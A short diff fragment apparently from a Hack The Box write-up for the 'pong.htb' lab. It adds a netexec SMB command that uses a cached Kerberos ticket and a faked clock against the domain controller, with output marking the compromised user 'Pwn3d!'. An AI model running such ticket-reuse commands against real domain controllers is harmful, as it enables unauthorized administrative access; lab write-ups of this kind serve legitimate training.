@@ -1069,3 +1069,11 @@ evil-winrm-py PS C:\Users\C.Carlssen\Documents>
 
 This user is now an admin on `dc2`
 
+```python
+❯❯❯ faketime -f +8h nxc smb dc2.pong.htb --use-kcache --smb-timeout 5
+SMB         dc2.pong.htb    445    dc2              [*]  x64 (name:dc2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
+SMB         dc2.pong.htb    445    dc2              [+] PONG.HTB\c.carlssen from ccache (Pwn3d!)
+```
+
+And of course i can use this ticket to show this too!
+
